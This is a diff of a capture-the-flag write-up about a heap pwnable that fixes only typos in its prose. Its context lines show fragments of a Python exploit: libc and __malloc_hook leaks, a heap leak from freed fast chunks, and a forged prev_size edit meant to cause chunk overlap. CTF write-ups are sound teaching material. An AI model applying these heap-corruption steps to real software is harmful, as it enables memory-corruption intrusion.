@@ -51,7 +51,7 @@ That's where the bug lies. We can provide an address and `flip` the **lsb** (lea
 
 Since this pwnable shouts loud and clear that it's heap related, the `flip` function exists for a specific reason. We'll probably
 have to (at least that's what I did) turn off the lsb of a heap chunk's `size` field in order to fool it into thinking that
-the previous chunk is free. First order of business, leaks. Let's kick it with the libc one.
+the previous chunk is free. First order of business, leaks. Let's kick it off with the libc one.
 
 ```python
 alloc(0x88, 0)
@@ -104,7 +104,7 @@ log.success("Libc:          0x{:x}".format(libc))
 log.success("__malloc_hook: 0x{:x}".format(mhook))
 ```
 
-Off to the heap leak now. Thank to `add` once again, we can get a heap leak this time by free-ing two fast chunks.
+Off to the heap leak now. Thanks to `add` once again, we can get a heap leak this time by free-ing two fast chunks.
 
 ```python
 # We can get a heap leak by free-ing two fast chunks
@@ -142,7 +142,7 @@ target = heap + 0x278
 log.success("Heap:          0x{:x}".format(heap))
 ```
 
-Now it's time to create the set up so that we can trigger a consolidation which will result in a chunk overlap.
+Now it's time to create the setup so that we can trigger a consolidation which will result in a chunk overlap.
 
 ```python
 edit(2, p64(0)*12 + p64(0x170))
